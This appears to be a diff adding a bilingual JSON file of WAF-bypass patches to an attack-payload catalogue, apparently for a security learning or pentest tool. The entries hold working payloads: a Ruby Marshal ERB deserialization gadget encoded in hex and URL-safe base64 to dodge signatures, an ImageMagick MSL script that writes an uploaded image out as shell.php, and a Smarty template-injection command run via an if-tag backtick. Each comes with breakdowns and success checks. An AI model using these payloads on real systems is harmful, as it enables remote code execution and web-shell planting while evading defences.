@@ -1,0 +1,196 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "nosql2-ruby-marshal",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "Marshal.load([\"04087b062208636d6422076964\"].pack('H*'))",
+          "command": "Marshal.load([\"04086f3a08455242063a094073726349220960696460063a064554\"].pack('H*'))",
+          "description": {
+            "zh": "绕过对 base64 Marshal 串（BAh 开头）的检测：改为十六进制传输再 pack 还原；流内容为真实 ERB gadget 对象流（04 08 版本头与 o: 对象标记，@src 指向反引号命令），Marshal.load 还原 ERB 实例，应用侧对其调用 result 时触发命令执行；判据：还原对象 class 为 ERB 且 @src 为反引号命令，result 渲染回显命令输出。",
+            "en": "Evades detection keyed on base64 Marshal strings (the BAh prefix) by delivering hex and restoring through pack. The stream is a real ERB gadget object (04 08 version header and an o: object marker whose @src holds a backtick command): Marshal.load rebuilds an ERB instance and execution fires when the application calls result on it. Check: restored object is ERB with the backtick command in @src."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Marshal.load(",
+              "explanation": {
+                "zh": "Marshal加载入口",
+                "en": "Marshal load sink"
+              },
+              "type": "function"
+            },
+            {
+              "part": ".pack('H*')",
+              "explanation": {
+                "zh": "十六进制还原字节",
+                "en": "Restores bytes from hex"
+              },
+              "type": "function"
+            },
+            {
+              "part": "0408",
+              "explanation": {
+                "zh": "Marshal版本头（0x04 0x08）",
+                "en": "Marshal version header (0x04 0x08)"
+              },
+              "type": "value"
+            },
+            {
+              "part": "6f3a08455242",
+              "explanation": {
+                "zh": "对象标记与ERB类名（o:+ERB）",
+                "en": "object marker and ERB class name (o: + ERB)"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "Marshal.load(Base64.urlsafe_decode64('BAh7BiIIY21kIgt3aG9hbWk='))",
+          "command": "Marshal.load(Base64.urlsafe_decode64('BAhvOghFUkIGOglAc3JjSSIJYGlkYAY6BkVU'))",
+          "description": {
+            "zh": "以 URL 安全字母表传输 gadget：编码产物不含 +、/ 与填充字符，可原样穿过 URL 参数与查询串，规避标准 base64 特征与斜杠过滤；解码结果为真实 ERB gadget 对象流（04 08 头，@src 指向反引号命令），Marshal.load 还原后应用侧调用 result 触发命令执行；判据：result 渲染回显命令输出。",
+            "en": "Carries the gadget in the URL-safe alphabet so it passes through query strings untouched, dodging standard base64 signatures and slash filtering; the encoded stream has no +, /, or padding characters. Decoding yields a real ERB gadget object (04 08 header, backtick command in @src) rebuilt by Marshal.load; execution fires when the application calls result. Success: command output rendered."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Marshal.load(",
+              "explanation": {
+                "zh": "Marshal加载入口",
+                "en": "Marshal load sink"
+              },
+              "type": "function"
+            },
+            {
+              "part": "Base64.urlsafe_decode64(",
+              "explanation": {
+                "zh": "URL安全Base64解码",
+                "en": "URL-safe base64 decode"
+              },
+              "type": "function"
+            },
+            {
+              "part": "BAhv",
+              "explanation": {
+                "zh": "流头与对象标记（04 08 o）",
+                "en": "stream header plus object marker (04 08 o)"
+              },
+              "type": "value"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cmdi2-component-rce",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+          "command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n<read filename=\"upload/polymorphic.jpg\"/>\n<write filename=\"shell.php\"/>\n</image>",
+          "syntaxBreakdown": [
+            {
+              "part": "<image>",
+              "explanation": {
+                "zh": "MSL 文档根元素",
+                "en": "MSL document root"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<read filename=",
+              "explanation": {
+                "zh": "MSL 读取原语，指回已上传的多态图片",
+                "en": "MSL read primitive pulling the uploaded image"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "upload/polymorphic.jpg",
+              "explanation": {
+                "zh": "字节中内嵌 PHP 代码的已上传图片",
+                "en": "uploaded image with PHP code embedded in its bytes"
+              },
+              "type": "value"
+            },
+            {
+              "part": "<write filename=",
+              "explanation": {
+                "zh": "MSL 写文件原语",
+                "en": "MSL write-file primitive"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "shell.php",
+              "explanation": {
+                "zh": "转写落地的 PHP 文件名",
+                "en": "PHP file name written out"
+              },
+              "type": "value"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ssti2-smarty-php",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "{PHP}echo `id`;{/PHP}",
+          "command": "{if $t=`id`}{$t}{/if}",
+          "title": {
+            "zh": "if 反引号变量中转变体",
+            "en": "if-Tag Backtick Variable Pivot"
+          },
+          "description": {
+            "zh": "改走 {if} 语句标签的真实混淆面：条件内以反引号执行命令并把输出存入模板变量，正文用 {$t} 输出，全程不出现 system/exec 函数名与 {php} 标签，可同时规避 {php} 黑名单与命令函数特征；本载荷所属 {php} 标签族仅存在于 Smarty <3.1、{php} 标签可用时，{if} 路线在模板安全模式关闭的各版本均可编译。判据：页面回显 id 输出。",
+            "en": "Moves to the real if-tag surface: a backtick runs inside the condition and stores its output in a template variable that the body prints, so neither a system/exec call name nor the php tag ever appears. The php-tag family this payload belongs to exists only on Smarty below 3.1 while the php tag is available; the if-tag route itself compiles wherever template security is off. Success: id output rendered."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{if",
+              "explanation": {
+                "zh": "条件标签入口",
+                "en": "Conditional tag entry"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "$t=`id`",
+              "explanation": {
+                "zh": "反引号执行并存入变量",
+                "en": "Backtick execution stored into a variable"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{$t}",
+              "explanation": {
+                "zh": "输出模板变量",
+                "en": "Prints the template variable"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "{/if}",
+              "explanation": {
+                "zh": "条件标签结束",
+                "en": "Conditional tag end"
+              },
+              "type": "payload"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
